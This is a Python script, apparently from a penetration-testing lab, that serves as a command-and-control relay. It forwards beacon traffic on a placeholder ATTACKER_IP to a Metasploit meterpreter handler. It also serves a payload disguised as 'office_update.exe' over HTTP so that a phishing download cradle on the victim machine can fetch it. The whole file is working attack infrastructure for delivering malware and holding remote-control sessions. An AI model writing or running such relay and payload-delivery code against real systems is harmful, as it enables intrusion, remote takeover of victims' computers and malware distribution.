# c2_relay.py - lab C2 bridge
# Binds the lab C2 address ATTACKER_IP (host's VMnet8 IP, reachable by the VM)
# and forwards the beacon (TCP 443) to the real msfconsole handler in Kali
# (loopback 127.0.0.1:4445, mirrored-WSL = same host). Also serves the payload
# over HTTP on :80 so the phish cradle can fetch it directly from the VM.
import socket, threading, os

C2 = "ATTACKER_IP"
RELAY_LOCAL = 4443
RELAY_TARGET = ("127.0.0.1", 4445)   # msfconsole in Kali (loopback, mirrored)
HTTP_PORT = 8080
HTTP_TARGET = ("127.0.0.1", 8090)    # python http.server in Kali serving /tmp

def pump(a, b, label):
    n = 0
    try:
        while True:
            d = a.recv(65536)
            if not d:
                break
            n += len(d)
            b.sendall(d)
        print(f"[relay] {label}: clean close (EOF), {n} bytes", flush=True)
    except OSError as e:
        print(f"[relay] {label}: error after {n} bytes: {e}", flush=True)
    finally:
        try: a.shutdown(socket.SHUT_WR)
        except OSError: pass

def handle(client):
    try:
        up = socket.create_connection(RELAY_TARGET, timeout=10)
    except OSError as e:
        print(f"[relay] upstream connect failed: {e}", flush=True)
        try: client.close()
        except OSError: pass
        return
    print(f"[relay] bridged {client.getpeername()} <-> {RELAY_TARGET}", flush=True)
    # CRITICAL: clear the connect-timeout so long meterpreter handshakes
    # (where one side waits >10s for the other) are NOT killed mid-stream.
    # Without this the recv() in pump() fires a socket.timeout after 10s and
    # the relay tears down the bridge -> msf reports "Reason: Died".
    try:
        client.settimeout(None)
        up.settimeout(None)
    except OSError:
        pass
    threading.Thread(target=pump, args=(client, up, "vm->msf"), daemon=True).start()
    pump(up, client, "msf->vm")
    try: up.close()
    except OSError: pass
    try: client.close()
    except OSError: pass

def start_relay():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((C2, RELAY_LOCAL))
    s.listen(16)
    print(f"[relay] listening {C2}:{RELAY_LOCAL} -> {RELAY_TARGET[0]}:{RELAY_TARGET[1]}", flush=True)
    while True:
        c, _ = s.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()

def fetch_payload():
    # Pull the beacon bytes once from Kali's http.server over the shared loopback.
    import urllib.request
    url = f"http://{HTTP_TARGET[0]}:{HTTP_TARGET[1]}/office_update.exe"
    data = urllib.request.urlopen(url, timeout=15).read()
    return data

def start_http():
    # Serve the payload as a static file over HTTP/1.1 (proper Content-Length,
    # no premature close -> works with Invoke-WebRequest and iwr).
    try:
        body = fetch_payload()
    except Exception as e:
        print(f"[http] WARNING: could not fetch payload yet: {e}", flush=True)
        body = None
    print(f"[http] serving payload ({len(body) if body else 0} bytes) on {C2}:{HTTP_PORT}", flush=True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((C2, HTTP_PORT))
    s.listen(16)
    def _serve_one(c, a):
        try:
            c.settimeout(15)   # timeout only the request-line read
            req = b""
            while b"\r\n\r\n" not in req:
                chunk = c.recv(4096)
                if not chunk:
                    return
                req += chunk
            first = req.split(b"\r\n", 1)[0].decode("latin1")
            print(f"[http] {a} {first}", flush=True)
            if body is None:
                c.sendall(b"HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                return
            resp = (b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: application/octet-stream\r\n"
                    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                    b"Connection: close\r\n\r\n") + body
            c.settimeout(None)  # wait as long as the browser needs (user deciding Keep/discard)
            c.sendall(resp)
        except Exception as e:
            print(f"[http] serve error: {e}", flush=True)
        finally:
            try: c.close()
            except OSError: pass

    while True:
        c, a = s.accept()
        threading.Thread(target=_serve_one, args=(c, a), daemon=True).start()

threading.Thread(target=start_relay, daemon=True).start()
start_http()
